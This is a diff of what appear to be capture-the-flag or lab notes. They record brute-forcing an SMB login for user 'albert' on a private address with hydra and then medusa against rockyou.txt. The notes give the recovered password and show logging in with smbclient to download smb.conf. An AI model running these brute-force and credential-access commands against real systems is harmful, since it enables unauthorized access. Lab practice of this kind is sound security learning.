@@ -36,10 +36,25 @@
 
     B. exiftool (jpg or png)
 
-4. Get password with Hydra
+4. Get password with... 
 
     A. hydra -l albert -P rockyou.txt smb://10.10.20.53
 
-    
+          results: no password
 
-  
+
+    B. medusa -h 10.10.20.53 -u albert -P rockyou.txt -M smbnt
+
+          results: password = bradley1
+    
+5. Log into smbclient
+
+    smbclient //10.10.20.53/smbshare -U albert 
+
+    password: bradley1
+
+6. Download smb file
+
+    get smb.conf
+
+
